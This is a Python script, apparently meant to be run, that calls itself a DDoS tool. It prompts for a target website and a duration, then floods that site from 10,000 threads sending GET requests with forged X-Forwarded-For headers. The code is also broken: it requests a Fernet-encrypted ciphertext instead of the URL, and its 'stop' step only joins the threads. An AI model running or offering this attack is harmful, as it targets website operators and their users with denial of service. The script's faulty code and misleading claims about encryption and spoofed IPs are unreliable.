import requests
import threading
import random
import time
from cryptography.fernet import Fernet

# Target website URL
url = input("Enter the website URL to attack: ")

# Attacking time (in minutes)
attack_time = int(input("Enter the attacking time (in minutes): "))

# Number of attacking IP addresses
num_ips = 10000

# Number of requests per IP
requests_per_ip = 1000

# Generate encryption key
key = Fernet.generate_key()
cipher_suite = Fernet(key)

# Function to send encrypted HTTP requests
def send_requests(ip):
    for _ in range(requests_per_ip):
        try:
            # Encrypt the URL
            encrypted_url = cipher_suite.encrypt(url.encode())
            
            # Generate random headers and user agent
            headers = {
                "User-Agent": f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
                "X-Forwarded-For": f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
            }
            
            # Send the request
            response = requests.get(encrypted_url, headers=headers)
            print(f"[{ip}] Sent request. Status code: {response.status_code}")
            
            # Rate limiting
            time.sleep(0.1)
        except:
            print(f"[{ip}] Failed to send request.")

# Generate attacking IP addresses
ip_addresses = [f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}" for _ in range(num_ips)]

# Create threads for each attacking IP
threads = []
for ip in ip_addresses:
    t = threading.Thread(target=send_requests, args=(ip,))
    threads.append(t)
    t.start()

# Wait for the specified attacking time
time.sleep(attack_time * 60)

# Stop all threads
for t in threads:
    t.join()

print("DDoS attack completed.")